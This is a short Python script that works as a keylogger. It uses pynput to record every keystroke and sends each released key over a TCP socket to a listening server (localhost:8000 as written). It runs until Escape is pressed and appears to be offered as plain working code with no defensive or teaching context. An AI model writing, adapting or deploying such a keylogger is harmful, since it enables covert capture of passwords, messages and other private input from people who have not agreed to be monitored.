from pynput import keyboard
import socket
server_address=('localhost',8000)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(server_address)
def press(key):
    try:
        print(" clicked {}",format(key.char))
        
    except AttributeError:
        print("clicked {}",format(key))
        
def release(key):
    if key == keyboard.Key.esc:
        client_socket.close()
        return False
    else:
        try:
            message=str(key.char)
        except AttributeError:
            message=str(key)
        client_socket.sendall(message.encode('utf-8'))
       
with keyboard.Listener(on_press=press, on_release=release) as listener:
    listener.join()